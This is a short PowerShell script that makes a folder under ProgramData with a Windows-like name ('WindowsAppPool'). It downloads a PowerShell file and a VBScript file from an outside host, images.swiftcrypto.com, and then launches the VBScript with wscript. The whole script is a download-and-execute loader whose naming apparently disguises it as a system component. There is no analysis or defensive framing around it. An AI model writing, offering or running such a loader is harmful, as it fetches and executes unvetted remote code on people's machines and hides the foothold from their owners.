$SrcUri = "https://images.swiftcrypto.com/"
$HomeDir = "C:\ProgramData\WindowsAppPool\"
New-Item -Path $HomeDir -Type directory

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri "$SrcUri/AppPool.ps1" -OutFile "$HomeDir\AppPool.ps1"
Invoke-WebRequest -Uri "$SrcUri/AppPool.vbs" -OutFile "$HomeDir\AppPool.vbs"

$Arguments = $("$HomeDir\AppPool.vbs")
Start-Process "wscript.exe" -ArgumentList $Arguments -Wait -NoNewWindow
